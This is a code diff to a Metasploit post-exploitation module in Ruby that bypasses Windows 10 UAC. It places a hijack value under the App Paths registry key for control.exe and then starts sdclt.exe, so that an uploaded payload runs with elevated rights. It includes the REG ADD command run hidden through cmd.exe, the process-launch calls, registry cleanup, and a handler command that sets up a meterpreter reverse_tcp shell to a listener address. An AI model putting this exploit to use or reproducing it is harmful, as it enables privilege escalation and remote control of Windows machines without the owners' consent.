@@ -10,28 +10,32 @@
 # Exploit Title  : enigma_AppPath_bypass.rb
 # Module Author  : pedr0 Ubuntu [r00t-3xp10it]
 # Vuln discover  : enigma0x3 | @mattifestation
-# Only works againt: Windows 10
+# Works againts  : Windows 10
 # POC: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths
 #
 #
 #
 # [ DESCRIPTION ]
-# Bypasses UAC by abusing the App Path key for control.exe
-# this post will highlight an alternative method that also doesn’t rely on the
-# IFileOperation/DLL hijacking approach. This technique works on Windows 10 build 15031,
-# As some of you may know, there are some Microsoft signed binaries that auto-elevate
-# due to their manifest. While searching for more of these auto-elevating binaries i came
-# across “sdclt.exe” and verified that it auto-elevates due to its manifest
+# "Bypasses UAC by abusing the App Path key for control.exe"
+# This post-module will use an alternative method that also doesn’t rely on the
+# IFileOperation/DLL hijacking approach. This technique works on Windows 10 build 15031.
+# This module will upload your payload.exe, create the required registry entry in the current
+# user’s hive and runs sdclt.exe (hijacking the process being started to gain code execution).
 #
-# Note: This only works on Windows 10. The manifest for sdclt.exe in Windows 7 has the
-# requestedExecutionLevel set to “AsInvoker”, preventing auto-elevation when started
-# from medium integrity. It is important to note that this technique does not allow
-# for parameters, meaning it requires your payload to be placed on disk someplace.
-# If you try to give the binary any parameters (e.g, C:\Windows\System32\cmd.exe /c calc.exe),
-# it will interpret the entire string as the lpFile value to the ShellExecuteInfo structure,
-# which is then passed over to ShellExecuteEx. Since that value doesn’t exist, it will not execute.
+# NOTE:
+# Some Microsoft signed binaries auto-elevate themselfs due to their manifest like "sdclt.exe"
+# The manifest for sdclt.exe in Windows 7 has the requestedExecutionLevel set to “AsInvoker”,
+# preventing auto-elevation when started from medium integrity. Also it is important to note
+# that this technique does not allow for parameters (e.g, %windir%\System32\cmd.exe /c calc.exe).
+# Meaning it requires your payload to be placed on disk someplace and simple execute it.
 # NOTE: "This module will not work if target UAC level its set to 'Always Notify'"
 #
+#
+#
+# [ EXPLOITATION ]
+# 1º - execute the payload.exe (to be uploaded) currespondent handler in background
+#      msf post(enigma_AppPath_bypass) > handler -p windows/meterpreter/reverse_tcp -H 192.192.1.69 -P 666
+# 2º - execute enigma_AppPath_bypass post-module
 #
 #
 # [ MODULE OPTIONS ]
@@ -41,13 +45,6 @@
 # The full path (local) of payload to be uploaded => set LOCAL_PATH /root/payload.exe
 # Check target vulnerability settings/status?     => set CHECK_VULN true
 # Delete malicious registry hive keys/values?     => set DEL_REGKEY true
-#
-#
-#
-# [ EXPLOITATION ]
-# 1º - execute the payload.exe currespondent handler in background
-#      msf post(enigma_AppPath_bypass) > handler -p windows/meterpreter/reverse_tcp -H 192.192.1.69 -P 666
-# 2º - execute enigma_AppPath_bypass post-module
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -65,6 +62,7 @@
 # msf post(enigma_AppPath_bypass) > show advanced options
 # msf post(enigma_AppPath_bypass) > set [option(s)]
 # msf post(enigma_AppPath_bypass) > exploit
+#
 #
 # [ HINT ]
 # In some linux distributions postgresql needs to be started and
@@ -116,7 +114,7 @@ class MetasploitModule < Msf::Post
                         'Author'        =>
                                 [
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
-                                        'Vuln discover: enigma0x3 | mattifestation', # credits
+                                        'Vuln discover: enigma0x3 | mattifestation',  # credits
                                 ],
  
                         'Version'        => '$Revision: 1.4',
@@ -164,9 +162,9 @@ class MetasploitModule < Msf::Post
 
 
 #
-# GAIN REMOTE CODE EXCUTION BY HIJACKING PROCESS
+# Gain code execution by hijacking sdclt.exe process
 #
-def ls_stage1
+def ls_hijack
 
   r=''
   session = client
@@ -190,7 +188,7 @@ def ls_stage1
   end
 
     #
-    # search in target regedit if binary calls App Paths
+    # Search in target regedit if hijack hive exists .. 
     #
     print_warning("Reading process registry hive keys ..")
     Rex::sleep(1.0)
@@ -208,7 +206,7 @@ def ls_stage1
     end
 
       #
-      # check target UAC settings (always notify - will abort module execution)
+      # Check target UAC settings (always notify - will abort module execution)
       #
       check_success = registry_getvaldata("#{uac_hivek}","#{uac_level}")
       # a dword:2 value it means 'always notify' setting is active.
@@ -243,16 +241,18 @@ def ls_stage1
         comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{dep_path}\\#{pay_name}\" /f"
         print_good(" exec => Placing hijack registry key ..")
         Rex::sleep(1.0)
+        #
+        # Execute process hijacking in registry ..
+        # REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe /ve /t REG_SZ /d %temp%\\payload.exe /f
+        #
+        print_good(" exec => Hijacking process to gain code execution ..")
+        r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
+        # give a proper time to refresh regedit 'enigma0x3' :D
+        Rex::sleep(4.5)
 
-
- # Execute process hijacking in registry ..
- # REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe /ve /t REG_SZ /d %temp%\\payload.exe /f
- print_good(" exec => Hijacking process to gain code execution ..")
- r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
- # give a proper time to refresh regedit 'enigma0x3' :D
- Rex::sleep(4.5)
-
-      # start remote service to gain code execution
+      #
+      # Start remote service to gain code execution ..
+      #
       print_good(" exec => Starting sdclt.exe native process ..")
       r = session.sys.process.execute("cmd.exe /c start sdclt.exe", nil, {'Hidden' => true, 'Channelized' => true})
       Rex::sleep(0.5)
@@ -272,10 +272,9 @@ end
 
 
 #
-# DELETE MALICIOUS REGISTRY ENTRY (process hijacking)
 # This funtion returns control.exe reg key to is default value ..
 #
-def ls_stage2
+def ls_clean
 
   r=''
   session = client
@@ -295,7 +294,7 @@ def ls_stage2
   end
 
     #
-    # Search in target regedit if hijacking method allready exists ..
+    # Search in target regedit if hijack hive key exists ..
     #
     print_warning("Reading process registry hive keys ..")
     Rex::sleep(1.0)
@@ -303,7 +302,7 @@ def ls_stage2
       print_good(" exec => Remote registry hive key found!")
       Rex::sleep(1.0)
     else
-       # registry hive key not found, aborting module execution.
+       # Registry hive key not found, aborting module execution.
        print_warning("Hive key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths")
        print_error("[ABORT]: module cant find the registry hive key needed ..")
        print_line("")
@@ -335,9 +334,9 @@ end
 
 
 #
-# CHECK TARGET VULNERABILITY STATUS/EXISTANCE
+# Check for target vulnerability status/existence
 #
-def ls_stage3
+def ls_vulncheck
 
   r=''
   session = client
@@ -476,15 +475,15 @@ def run
 # Selected settings to run
 # ------------------------------------
       if datastore['DEPLOY_PATH']
-         ls_stage1
+         ls_hijack
       end
 
       if datastore['DEL_REGKEY']
-         ls_stage2
+         ls_clean
       end
 
       if datastore['CHECK_VULN']
-         ls_stage3
+         ls_vulncheck
       end
    end
 end
